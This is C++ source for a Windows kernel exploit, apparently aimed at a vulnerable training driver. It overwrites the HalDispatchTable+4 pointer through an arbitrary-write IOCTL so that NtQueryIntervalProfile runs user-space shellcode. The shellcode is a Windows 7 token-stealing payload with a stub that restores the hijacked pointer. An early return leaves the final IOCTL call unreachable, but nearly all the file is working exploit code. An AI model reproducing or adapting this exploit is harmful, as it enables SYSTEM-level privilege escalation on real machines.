#include "ArbitraryOverwrite.h"

bool 
ExploitArbitraryOverwrite::exploit() {
	
	struct arbitrary_overwrite_structure {
		LPVOID where;
		LPVOID what;
	};
	
	static const string halDispatchTable = "HalDispatchTable";
	
	auto kernelModule = driver.GetKernelModuleInfos();	
	const DWORD kernelModuleImageBase = get<0>(kernelModule);
	const wstring kernelModuleName = get<2>(kernelModule);	
	
	if(!kernelModuleImageBase) { 
		wcerr << L"[!] Could not load kernel's module informations." << endl;
		return false;
	}
	
	wcout << L"[.] Loading " << kernelModuleName << endl;
	HMODULE kernelBaseInUserSpace = LoadLibraryW(kernelModuleName.c_str());
	
	if(!kernelBaseInUserSpace) {
		DWORD err = GetLastError();
		wcerr << L"[!] Could not load kernel's module. Error: " 
				<< getErrorString(err) << L" (" << err << L")" << endl;
		return false;
	}
	
	cout << "[.] Determining "  << halDispatchTable << " symbol's offset." << endl;
	
	const auto halDispatchTableAddr = GetProcAddress(
		kernelBaseInUserSpace, 
		halDispatchTable.c_str()
	);
		
	if(!halDispatchTableAddr) {
		wcerr << L"[!] Could not determine that symbol's offset";
		return false;
	}
	
	const DWORD halDispatchTableRealAddr = (
		reinterpret_cast<DWORD>(halDispatchTableAddr) -
		reinterpret_cast<DWORD>(kernelBaseInUserSpace) +
		kernelModuleImageBase +
		sizeof(PVOID)					// to point to the second entry in that array
	);
	
	const void* Shellcode_Ptr = reinterpret_cast<void*>(prepareCustomPayload(
		halDispatchTableRealAddr
	));
	
	if(!Shellcode_Ptr) {
		return false;
	}
	
	cout << "[+] `" << halDispatchTable << "+4` is located at: 0x" << hex << setw(8) << setfill('0')
		<< halDispatchTableRealAddr << endl;
		
	/**
	 * we will be overwriting (hal!HalDispatchTable+4) that contains function pointer to the
	 *	hal!HaliQuerySystemInformation. That function can be reached by the following chain:
	 *		
	 *		NtQueryIntervalProfile() -> KeQueryIntervalProfile() -> HaliQuerySystemInformation()
	 *
	 * So calling `NtQueryIntervalProfile()` will be sufficient to trigger our overwritten pointer.
	**/
	
	arbitrary_overwrite_structure structure = {
		/* where */ reinterpret_cast<LPVOID>(halDispatchTableRealAddr),
		/* what  */ const_cast<LPVOID>(Shellcode_Ptr)
	};
	
	wcout << L"[+] Arbitrary Overwrite:\nt\t- Where: 0x" << hex << setw(8) << setfill(L'0')
			<< structure.where << L"(hal!HaliQuerySystemInformation)\n\t- What: 0x" 
			<< structure.what << L" (address of shellcode in user space memory)" << endl;
			
	return false;

	bool ret = driver.SendIOCTL (
		ExploitArbitraryOverwrite::Ioctl_Code,
		&structure,
		sizeof(structure)
	);
	
	return ret;
}

LPVOID 
ExploitArbitraryOverwrite::prepareCustomPayload(
	DWORD halDispatchTableRealAddr
) {
	
	shared_ptr<LPVOID> customPayloadPtr(new LPVOID(
		VirtualAlloc(
			(LPVOID)0,
			ExploitArbitraryOverwrite::Shellcode_Size,
			MEM_COMMIT | MEM_RESERVE,
			PAGE_EXECUTE_READWRITE
		)
	),
	[](LPVOID* ptr) {
		if (*ptr != nullptr) {
			wcout << L"[.] Freeing memory allocated for the custom payload." << endl;
			VirtualFree(*ptr, MEM_DECOMMIT, ExploitArbitraryOverwrite::Shellcode_Size);
		}
	});
	
	if(!customPayloadPtr) {
		wcerr << L"[!] Could not allocate memory for the custom payload!" << endl;
		return 0;
	}
	
	customPayload = move(customPayloadPtr);
	
	const size_t sizeOfShellcode = 
		reinterpret_cast<size_t>(&token_stealing_win7_end) - 
		reinterpret_cast<size_t>(&token_stealing_win7);
		
	memset (
		customPayload.get(),
		0x90, 
		ExploitArbitraryOverwrite::Shellcode_Size
	);
	
	size_t nopsCave = 0;
	UCHAR* tokenStealingPayloadPtr = reinterpret_cast<UCHAR*>(&token_stealing_win7);
	
	for(size_t pos = sizeOfShellcode; pos > sizeOfShellcode / 2; pos--) {
		if (tokenStealingPayloadPtr[pos] == 0x90 		&& 
			tokenStealingPayloadPtr[pos-1] == 0x90 	&& 
			tokenStealingPayloadPtr[pos-2] == 0x90 	&& 
			tokenStealingPayloadPtr[pos-3] == 0x90
		) {
			// Found NOPs cave.
			nopsCave = pos - 3;
			break;
		}
	}
	
	memcpy (
		customPayload.get(), 
		tokenStealingPayloadPtr, 
		nopsCave
	);

	unsigned char restorePreviousPointer[] = {
		0xfa,							// cli
		0xb8, 0x44, 0x33, 0x22, 0x11, 	// mov eax, hal!HalDispatchTable+8
		0x8b, 0x18, 0x81, 				// mov ebx, [eax]
		0xeb, 0xdd, 0xcc, 0xbb, 0xaa, 	// sub ebx, diff
		0x89, 0x58, 0xfc,				// mov [eax - 4], ebx
		0xfb							// sti
	};
	
	// adjusting the payload
	*(reinterpret_cast<DWORD*>(&restorePreviousPointer[ 2])) = halDispatchTableRealAddr + 4;
	*(reinterpret_cast<DWORD*>(&restorePreviousPointer[10])) = HAL_THIRD_TO_SECOND_ENTRY_DIFFERENCE;
	
	memcpy (
		customPayload.get() + nopsCave + 4, 
		restorePreviousPointer, 
		sizeof(restorePreviousPointer)
	);
	
	memcpy (
		customPayload.get() + nopsCave + 4 + sizeof(restorePreviousPointer), 
		reinterpret_cast<void*>(&tokenStealingPayloadPtr[nopsCave + 4]),
		sizeOfShellcode - nopsCave - 4
	);
	
	wcout << L"[.] Constructed custom payload capable of restoring overwritten pointer." << endl;
	
	return customPayload.get();
}
